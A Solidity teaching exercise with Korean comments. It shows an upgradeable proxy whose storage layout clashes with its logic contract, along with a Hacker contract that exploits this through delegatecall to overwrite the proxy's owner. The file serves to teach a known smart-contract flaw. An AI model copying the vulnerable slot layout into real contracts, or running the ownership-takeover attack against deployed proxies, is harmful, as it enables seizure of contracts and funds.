// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract ProxyContract {
    address public owner;
    address public logicalAddr;        

    uint256 public x;
    uint256 public y;
    //proxy의 slot 0: owner, 1: logicalAddr, 2: x, 3: y 
    // 로직 컨트랙트의 주소를 초기화
    constructor(address _Addr) {        
        logicalAddr = _Addr;      
        owner = msg.sender;
    }
    
    // 로직 컨트랙트의 주소를 변경
    function upgrade(address _newAddr) public {
        if (msg.sender == owner)
            logicalAddr = _newAddr;
    }    
    
    // 클라이언트 함수 호출을 로직 컨트랙트에게 전달
    fallback() external payable {
        (bool success, ) = logicalAddr.delegatecall(msg.data);
        require(success , " Error calling logical contract");
    }
}

contract LogicalContractV1 {    
    uint256 public x;
    uint256 public y;
        
    function updateX(uint256 _num) public {
        x = _num;
    }

    function updateY(uint256 _num) public {
        y = _num;
    }
}

// (연습문제 1) 프록시 컨트랙트의 owner 주소를 자신의 주소로 변경하는 Hacker 컨트랙트를 작성하시오.
contract Hacker{
    address public proxyAddr;

    // 프록시 컨트랙트의 주소를 설정
    constructor(address _Addr) {        
        proxyAddr = _Addr;
    }
     function attack() public {  
        //slot 0에 owner 저장. logical의 0번 slot에 x 저장. 
        //updateX를 통해 X에 Hacker 주소를 넣으면 이는 곧 proxy slot 0번 째인 owner에 대응. 따라서 owner가 hacker의 주소로 변경                       
        proxyAddr.call(abi.encodeWithSignature("updateX(uint256)", address(this)));
    }  
}

